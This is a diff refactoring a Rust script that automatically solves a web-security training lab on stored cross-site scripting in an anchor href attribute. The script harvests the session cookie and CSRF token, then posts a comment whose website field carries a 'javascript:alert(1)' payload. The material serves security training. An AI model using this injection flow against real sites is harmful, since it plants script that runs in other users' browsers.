@@ -1,24 +1,17 @@
-/********************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 17/11/2023
+/*****************************************************************************
 *
 * Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
 *
-* Steps: 1. Fetch a post page
-*        2. Extract the session cookie and the csrf token to post a comment
-*        3. Post a comment with the injected payload in the website field
+* Hack Steps: 
+*      1. Fetch a post page
+*      2. Extract the session cookie and the csrf token to post a comment
+*      3. Post a comment with the injected payload in the website field
 *
-*********************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+******************************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use select::{document::Document, predicate::Attr};
@@ -29,83 +22,38 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
-fn main() {
-    // change this to your lab URL
-    let url = "https://0af2008a0401c0468389746300960050.web-security-academy.net";
+// Change this to your lab URL
+const LAB_URL: &str = "https://0ae300ad03599213819d1173008900ff.web-security-academy.net";
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    print!("{}", "⦗1⦘ Fetching a post page.. ".white());
-    io::stdout().flush();
-
-    // fetch a post page
-    let post_page = client
-        .get(format!("{url}/post?postId=1"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch a post page".red()));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract session cookie
-    let session = extract_session_cookie(post_page.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token to post a comment
-    let mut csrf = extract_csrf(post_page).expect(&format!(
-        "{}",
-        "[!] Failed to extract csrf to post a comment".red()
-    ));
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
-        "⦗3⦘ Posting a comment with the injected payload in the website field.. ".white(),
-    );
-    io::stdout().flush();
-
-    // payload to call the alert function
-    let payload = "javascript:alert(1)";
-
-    // post a comment with the injected payload in the website field
-    client
-        .post(format!("{url}/post/comment"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("postId", "1"),
-            ("name", "Hacker"),
-            ("email", "hack@me.com"),
-            ("comment", "you are hacked"),
-            ("website", payload),
-            ("csrf", &csrf),
-        ]))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to post a comment with the injected payload in the website field".red()
-        ));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as".white(),
-        "solved".green()
-    )
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn main() {
+    print!("⦗1⦘ Fetching a post page.. ");
+    flush_terminal();
+
+    let post_page = fetch("/post?postId=1");
+
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ");
+    flush_terminal();
+
+    let session = get_session_cookie(&post_page);
+    let csrf_token = get_csrf_token(post_page);
+
+    println!("{}", "OK".green());
+    print!("⦗3⦘ Posting a comment with the injected payload in the website field.. ");
+    flush_terminal();
+
+    let payload = "javascript:alert(1)";
+    post_comment(&payload, &session, &csrf_token);
+
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::default())
         .connect_timeout(Duration::from_secs(5))
@@ -113,40 +61,57 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn post_comment(website: &str, session: &str, csrf_token: &str) {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/post/comment"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("postId", "1"),
+            ("name", "Hacker"),
+            ("email", "hack@me.com"),
+            ("comment", "you are hacked"),
+            ("website", website),
+            ("csrf", csrf_token),
+        ]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to post a comment with the injected payload in the comment field".red()
+        ));
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
